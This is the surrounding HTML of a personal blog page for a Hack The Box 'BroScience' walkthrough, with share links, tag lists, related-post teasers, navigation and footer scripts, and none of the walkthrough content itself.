        <a href="https://twitter.com/intent/tweet?text=Hack+The+Box+-+BroScience+-+Ankit+Kanojiya&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHackTheBox-Walkthrough-BroScience%2F" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Hack+The+Box+-+BroScience+-+Ankit+Kanojiya&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHackTheBox-Walkthrough-BroScience%2F" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHackTheBox-Walkthrough-BroScience%2F&text=Hack+The+Box+-+BroScience+-+Ankit+Kanojiya" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copy link"
        data-title-succeed="Link copied successfully!">
    </i>

  </span>
</div>


  </div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="ankitkanojiya" data-description="Support me on Buy me a coffee!" data-message="" data-color="#BD5FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

      
    
    

    </div>
  </div> <!-- #core-wrapper -->

  <!-- panel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted">

    <div class="access">
      















      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/hacking/">Hacking</a>
    
      
      <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a>
    
      
      <a class="post-tag" href="/tags/machine/">Machine</a>
    
      
      <a class="post-tag" href="/tags/walkthrough/">Walkthrough</a>
    
      
      <a class="post-tag" href="/tags/medium/">Medium</a>
    
      
      <a class="post-tag" href="/tags/linux/">linux</a>
    
      
      <a class="post-tag" href="/tags/cve/">cve</a>
    
      
      <a class="post-tag" href="/tags/easy/">Easy</a>
    
      
      <a class="post-tag" href="/tags/c/">c</a>
    
      
      <a class="post-tag" href="/tags/chroot/">chroot</a>
    

    </div>
  </div>


    </div>

    
      
      



<!-- BS-toc.js will be loaded at medium priority -->
<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>

<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
  <div class="panel-heading pl-3 pt-2 mb-2">Contents</div>
  <nav id="toc" data-toggle="toc"></nav>
</div>


    
  </div>

</div>

<!-- tail -->

<div class="row">
  <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5">
    
      
      <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->





  <div id="related-posts" class="mb-2 mb-sm-4">
    <h3 class="pt-2 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/HackTheBox-Walkthrough-Health/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1673020800"
    data-df="ll"
    >
  Jan  7, 2023
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Health</h3>
            <div class="text-muted small">
              <p>
                





                This was a difficult, but fun machine. It came out as an easy machine before being reclassified as medium. It took me a long time before I finally pwned it.

It started with using a web application...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/2023/01/HTB/UpDown">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1674230400"
    data-df="ll"
    >
  Jan 21, 2023
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - UpDown</h3>
            <div class="text-muted small">
              <p>
                





                It took me a long time to get a foothold on that machine. But once I was in, getting the user and root was very easy.


  Room: UpDown
  Difficulty: Medium
  URL: https://app.hackthebox.com/machine...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/HackTheBox-Walkthrough-Ambassador/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1674835200"
    data-df="ll"
    >
  Jan 28, 2023
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Ambassador</h3>
            <div class="text-muted small">
              <p>
                





                This was a really fun box where I had to use multiple vulnerabilities. There was a Local File Inclusion (LFI), credentials stored in clear, misconfiguration, and a Git repository with a token in it...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->


    
      
      <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/posts/HackTheBox-Walkthrough-Mentor/" class="btn btn-outline-primary"
    prompt="Older">
    <p>Hack The Box - Mentor</p>
  </a>
  

  
  <a href="/2023/04/HTB/Encoding" class="btn btn-outline-primary"
    prompt="Newer">
    <p>Hack The Box - Encoding</p>
  </a>
  

</div>

    
      
      <!--  The comments switcher -->


    
  </div>
</div>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/hacking/">Hacking</a>
    
      
      <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a>
    
      
      <a class="post-tag" href="/tags/machine/">Machine</a>
    
      
      <a class="post-tag" href="/tags/walkthrough/">Walkthrough</a>
    
      
      <a class="post-tag" href="/tags/medium/">Medium</a>
    
      
      <a class="post-tag" href="/tags/linux/">linux</a>
    
      
      <a class="post-tag" href="/tags/cve/">cve</a>
    
      
      <a class="post-tag" href="/tags/easy/">Easy</a>
    
      
      <a class="post-tag" href="/tags/c/">c</a>
    
      
      <a class="post-tag" href="/tags/chroot/">chroot</a>
    

    </div>
  </div>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    <!-- The Footer -->

<footer>
  <div class="container pl-lg-4 pr-lg-4">
    <div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3">
      <div class="footer-left">
        <p class="mb-0">
          © 2023
          <a href="https://twitter.com/AnkitKanojiya69">Ankit Kanojiya</a>.
          
          <span data-toggle="tooltip" data-placement="top"
            title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
          
        </p>
      </div>

      <div class="footer-right">
        <p class="mb-0">

          

          

          Powered by 
          <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
           with 
          <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
           theme.
        </p>
      </div>
    </div>
  </div>
  <div class="mt-auto d-flex flex-wrap justify-content-center align-items-center">
    <script src="https://www.hackthebox.eu/badge/1256978"></script>
    <script src="https://tryhackme.com/badge/50213"></script>
  </div>
</footer>


    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    
      <div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true"
        data-animation="true" data-autohide="false">
        <div class="toast-header">
          <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="toast-body text-center pt-0">
          <p class="pl-2 pr-2 mb-3">A new version of content is available.</p>
          <button type="button" class="btn btn-primary" aria-label="Update">
            Update
          </button>
        </div>
      </div>
    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No results found.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup & clipboard -->
  

  







  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script>







  

  

  







  
    

    

  



  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script>








<script defer src="/assets/js/dist/post.min.js"></script>



<!-- commons -->

<script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script>




  </body>

</html>

